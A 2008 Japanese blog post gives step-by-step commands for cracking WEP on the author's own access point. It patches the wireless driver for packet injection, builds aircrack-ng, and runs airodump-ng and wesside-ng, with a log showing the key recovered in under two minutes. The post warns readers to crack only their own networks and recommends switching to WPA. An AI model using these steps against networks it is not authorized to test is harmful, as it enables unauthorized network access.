---
title: MSI Wind+UbuntuでWEPキーをクラックする
author: 魚住 惇
type: post
date: 2008-08-21T04:39:12+00:00
url: /msi-windubuntu-wep-crack-132.html
thumbnail: /wp-content/uploads/2008/08/082108-0437-msiwindubun1.png
has_been_twittered:
  - failed
twitter_failure_code:
  - 400
twitter_failure_reason:
  - Settings do not permit the auto-tweeting of old posts
views:
  - 67
scc_follow_count_feedly:
  - 37
categories:
  - Wind＋Ubuntu

---
HDDを160GBにしたので、色々と実験する為だけのUbuntuをインストールしました。

これで、いつも使っているUbuntuをそのままにして、

新しいアプリケーションやKernelを試すのを今回インストールした方にしました。

そして今回は、WindにインストールしたUbuntuで無線LANのWEPキーをクラックしてみました。

<!--more-->

<span style="color: red;"><b>※今回の記事は、WEPの脆弱性について身をもって知ってもらう為に書きました。 </b></span> <span style="color: red;"><b>クラックするのは自分で設定したアクセスポイントだけにしてください！ </b></span> <span style="color: red;"><b>　他人の家庭のアクセスポイントをクラックすると、法律に触れます！</b> </span>

まず、今回の環境はこんな感じです。

  * Ubuntu7.10をインストールした後、**8.04にアップグレードした直後**
  * 無線LANは**intel 4965 agn** に換装済み
  * Kernelのバージョンは**2.6.24-19-generic** 

<span style="text-decoration: underline;">1.無線LANの通信でPacket injectionに対応させる </span> /usr/srcで作業するので、移動します。

**cd /usr/src** 

wgetコマンドで、必要なファイルをダウンロードします。

**wget http://dl.aircrack-ng.org/iw.tar.bz2** **wget http://www.orbit-lab.org/kernel/compat-wireless-2.6/2008/06/compat-wireless-2008-06-25.tar.bz2** **wget http://patches.aircrack-ng.org/mac80211\_2.6.26-rc8-wl\_frag.patch** **wget http://www.intellinuxwireless.org/iwlwifi/downloads/iwlwifi-4965-ucode-4.44.1.20.tgz** 

このファイルもダウンロードして、/usr/srcにコピーしておきます。

※コピーはルート権限ですること

**http://tinyshell.be/aircrackng/forum/index.php?action=dlattach;topic=2898.0;id=360** 

ファイルが揃ったら、解凍してコンパイルです。

<span style="color: red;"><b>sudo -i </b></span>

※毎回sudoするのが面倒なので、ルートに入ります

**tar -xvjf compat-wireless-2008-06-25.tar.bz2** **cd compat-wireless-2008-06-25** **apt-get install patch** **patch -p1 < /usr/src/0001-iwlwifi-Fix-packet-injection-in-iwl3945-and-iwl4965.patch** **patch -p1 < /usr/src/mac80211\_2.6.26-rc8-wl\_frag.patch** **make** **make install** **make load** **modprobe -r iwl4965** **modprobe iwl4965** **cd ..** **tar -vxzf iwlwifi-4965-ucode-4.44.1.20.tgz** **cp ./iwlwifi-4965-ucode-4.44.1.20/iwlwifi-4965-1.ucode /lib/firmware/** **tar -xvjf iw.tar.bz2** **make** **make install** 

これで無線LANデバイスの設定が終わりました。

一度ここで再起動します。

<span style="text-decoration: underline;">2.Aircrack-ngをインストールする </span> まず、開発環境を作ります

**apt-get install libc6-dev libssl-dev build-essentials** **apt-get install libnl-dev** 

ソースコードをコンパイルします

**wget http://download.aircrack-ng.org/aircrack-ng-1.0-rc1.tar.gz** **tar -vzxf aircrack-ng-1.0-rc1.tar.gz** **cd aircrack-ng-1.0-rc1** **make** **make install**

<span style="text-decoration: underline;">3.実際にWEPキーをクラックしてみる </span> まず、無線LANをモニターモードに設定します

**airmon-ng start wlan0** 

これで、**ifconfig**コマンドでインターフェイスを調べると、

モニターモードのNICが作成されます。

俺の環境の場合は、mon0というNICが新しくできていました。

次に、無線APを確認します。

それでは、「jun_room」をクラックしてみましょう。

{{< figure src="/wp-content/uploads/2008/08/082108-0437-msiwindubun1.png" alt="" >}} 

まず、BSSIDを調べます。

**airodump-ng mon0** 

このコマンドで、周辺の無線APが通信しているMACアドレスを調べることができます

{{< figure src="/wp-content/uploads/2008/08/082108-0437-msiwindubun2.png" alt="" >}} 

Jun_roomのBSSIDが判明しましたね

そしていよいよクラックです

**wesside-ng -v 00:07:40:XX:XX:XX -i mon0** 

-vでBSSID,-iでインターフェイスを指定します

以下、ログです。

[12:59:26] WARNING: Appending in wep.cap

[12:59:26] WARNING: reading prga from prga.log

[12:59:26] Got 144 bytes of prga IV=(87:4d:59) PRGA=29 71 32 E6 53 26 18 D4 47 6A CB B1 05 36 54 AC 06 72 D3 1D 0B 87 BB D7 E2 9B BD EE 85 B9 4C 34 90 63 29 F0 27 FC 3D 34 57 AA 1E 5E 25 61 70 41 66 DD 10 B3 F7 82 83 8A 82 D6 D6 CB 4A 98 46 6E 57 3A 69 84 1E 18 0A CD DF 00 0F E4 41 BC 40 41 8C 3F 87 B0 A7 DC 07 F5 DA 81 6B 94 3E D6 6C E3 45 00 6D D8 22 77 EB 59 A6 10 74 85 15 60 1F 13 7D 25 59 F7 E9 DC EE 9F 08 20 B5 77 D4 D0 EA 06 1B 0B 00 F3 BE 41 AE 91 D7 73 7B E0 6C BC C8 C8

[12:59:26] Looking for a victim&#8230;

[12:59:26] Found SSID(jun_room) BSS=(00:07:40:XX:XX:XX) chan=1

[12:59:26] Authenticated

[12:59:26] Associated (ID=6)

?中略?

[13:00:51] Starting crack PID=15877

[13:00:51] KEY=(ここにキーが表示されます)

<span style="color: red;">Owned in 1.42 minutes </span>

[13:00:51] Dying&#8230;

[13:00:51] Stopping crack PID=15877

[13:00:51] KEY=(ここにキーが表示されます)

<span style="color: red;">Owned in 1.42 minutes </span>

[13:00:51] Dying&#8230;

[13:00:51] Dying&#8230;

なんと、**2分かからなかった**とな(´ﾍ｀；)

みなさん、如何だったでしょうか。

WEPはもう駄目です。

WPAに変えるか、SSIDを隠しましょう。